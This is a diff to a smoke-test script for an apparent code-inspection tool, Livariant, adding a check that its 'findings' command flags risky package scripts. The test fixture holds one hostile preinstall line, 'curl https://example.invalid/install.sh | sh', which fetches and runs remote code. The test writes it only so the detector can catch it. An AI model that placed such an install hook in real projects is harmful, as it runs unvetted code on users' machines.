@@ -53,14 +53,16 @@ try {
   const entries = packResult[0]?.files?.map((file) => file.path) ?? [];
   for (const required of [
     "dist/src/cli/discover-command.js",
+    "dist/src/cli/findings-command.js",
     "dist/src/cli/understand-command.js",
     "dist/src/cli/adopt-understanding-command.js",
+    "dist/src/findings/project-findings.js",
     "dist/src/project/bootstrap-discovery.js",
     "dist/src/project/understanding-review.js",
     "dist/src/project/understanding-adoption.js",
     "dist/src/runtime/initialization.js",
   ]) {
-    if (!entries.includes(required)) throw new Error(`Packed artifact is missing discovery/understanding/adoption runtime file: ${required}`);
+    if (!entries.includes(required)) throw new Error(`Packed artifact is missing discovery/findings/understanding/adoption runtime file: ${required}`);
   }
 
   await writeFile(resolve(installHost, "package.json"), JSON.stringify({
@@ -73,7 +75,9 @@ try {
   await writeFile(resolve(projectDir, "package.json"), JSON.stringify({
     name: "installed-discovery-smoke",
     dependencies: { react: "1.0.0" },
+    scripts: { preinstall: "curl https://example.invalid/install.sh | sh" },
   }), "utf8");
+  await writeFile(resolve(projectDir, "package-lock.json"), "{}\n", "utf8");
   await writeFile(resolve(projectDir, "README.md"), "# Installed discovery smoke\n", "utf8");
   await writeFile(resolve(projectDir, ".env"), "TOKEN=PACKAGE_SMOKE_SECRET\n", "utf8");
 
@@ -97,6 +101,21 @@ try {
   }
   if (result.stdout.includes("PACKAGE_SMOKE_SECRET")) {
     throw new Error("Installed discover exposed sensitive file contents");
+  }
+
+  const findingsResult = run(process.execPath, [cliPath, "findings", "--json"], {
+    cwd: projectDir,
+    env: { PBF_RUNTIME_DELEGATION_BYPASS: "1" },
+  });
+  const findings = JSON.parse(findingsResult.stdout.trim());
+  if (findings.changesMade !== 0 || findings.schemaVersion !== 1) {
+    throw new Error(`Installed findings returned unexpected state:\n${findingsResult.stdout}`);
+  }
+  if (!findings.findings?.some((item) => item.ruleId === "LV-FND-SEC-002" && item.severity === "high" && item.confidence === "strong")) {
+    throw new Error(`Installed findings did not detect the deterministic risky package-script pattern:\n${findingsResult.stdout}`);
+  }
+  if (findingsResult.stdout.includes("PACKAGE_SMOKE_SECRET")) {
+    throw new Error("Installed findings exposed sensitive file contents");
   }
 
   const reviewPath = resolve(projectDir, "review.json");
@@ -130,11 +149,11 @@ try {
 
   const entriesAfter = await import("node:fs/promises").then(({ readdir }) => readdir(projectDir));
   if (entriesAfter.includes(".project-brain")) {
-    throw new Error("Installed discover/understand mutated the project by creating Project Brain state");
+    throw new Error("Installed discover/findings/understand mutated the project by creating Project Brain state");
   }
 
   const installedPackage = JSON.parse(await readFile(resolve(installHost, "node_modules", "livariant", "package.json"), "utf8"));
-  console.log(`Discovery/understanding/adoption package smoke passed for Livariant ${installedPackage.version}: installed package exposes the bounded discovery, review, and controlled-adoption runtime surfaces while read-only inspection remains non-mutating.`);
+  console.log(`Discovery/findings/understanding/adoption package smoke passed for Livariant ${installedPackage.version}: installed package exposes bounded evidence-backed inspection and controlled-adoption surfaces while read-only inspection remains non-mutating.`);
 } finally {
   await rm(temp, { recursive: true, force: true });
 }
